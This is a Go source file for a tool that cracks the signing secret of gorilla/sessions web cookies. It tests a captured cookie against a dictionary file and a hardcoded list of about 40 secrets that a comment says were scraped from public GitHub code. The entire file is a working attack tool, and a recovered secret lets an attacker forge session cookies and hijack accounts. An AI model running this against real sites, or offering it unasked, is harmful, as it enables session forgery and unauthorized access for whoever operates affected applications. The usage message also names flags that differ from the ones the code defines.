package main

import (
        "fmt"
        "flag"
        "net/http"
        "io"
        "os"
        "bufio"
        "github.com/gorilla/sessions"
)


func main(){
        name := flag.String("n", "", "Cookie name is required")
        secret := flag.String("s", "", "Session store secret is required")
        sess := flag.String("v", "", "Cookie value is required")
        dict := flag.String("f", "", "Dict file optional param")
        flag.Parse()

        if len(*dict) != 0 {
                file , err := os.Open(*dict)
                if err != nil {
                        fmt.Printf("File did not exist %s\n", err)
                        os.Exit(1)
                }
                defer file.Close()
                reader := bufio.NewReader(file)
                scanner := bufio.NewScanner(reader)
                for scanner.Scan() {
                        default_pws = append(default_pws,scanner.Text())
                }
        }
        if len(*secret) != 0 {
                default_pws = append(default_pws, *secret)
        }
        if len(*name)==0 || len(*sess)==0 {
                fmt.Println("-name and -value and -secret must be set")
                fmt.Println("Example: ./g2b2 -name=session-name -value=MQT... -secret=something-very-secret -file=")
                os.Exit(1)
        }

        var reader io.Reader;
        var c http.Cookie;

        c.Name=*name
        c.Value=*sess

        for _, j:=range default_pws {
                store := sessions.NewCookieStore([]byte(j))
                r, _:=http.NewRequest("", "", reader)
                r.AddCookie(&c) 
                _, err := store.Get(r, c.Name)
                if err != nil {
                        fmt.Printf("Secret not %s\n", j)
                        continue
                }
                fmt.Println("SESSION FOUND:")
                fmt.Printf("The secret is '%s'\n", j)
                os.Exit(0)
        }
        
}

/*
These are passwords I found on the first 30 pages of 
github with a search of "sessions.NewCookieStore([]byte"
It's a damn shame.
*/
var default_pws = []string{
        "auth_token_goes_here",
        "nightdev",
        "todo-change-this",
        "A-Tonga-da-Mironga-do-Kabulete",
        "todo-change-to-secret",
        "secret123",
        "SESSION_SECRET",
        "go-tap-very-secret",
        "secret_words_key_xxx",
        "coffee-maker",
        "auth_token_goes_here",
        "secret-session",
        "no one will guess this passphrase",
        "nonotestetstsst",
        "cookie_secret",
        "status-quo-go",
        "261AD9502C583BD7D8AA03083598653B",
        "youdontknow",
        "Go Game Lobby!",
        "SECRET",
        "",
        "5bf1fd927dfb8679496a2e6cf00cbe50c1c87145",
        "localhost",
        "d8e2f09c-6e37-44a8-a3ec-7a5608b54383",
        "123456789",
        "doughboy",
        "secret-pass",
        "eca7951a-17d7-4bf6-867b-9bd563d8e09b",
        "very-very-secret",
        "NiseGoPostSecret",
        "supersecretkeydelamortquitue",
        "hellogolang.org",
        "mgoAdmin@xuender",
        "324546fa343e8b9067bb412d678a89e83629ffe23940",
        "xuender@gmail.com",
        "sklyar",
        "secret",
        "kjsd2hgi3rez3aeltkxv",
        "GOTLongLiveSessionStore",
        "s3cr3t",
        "something-very-secret",
}
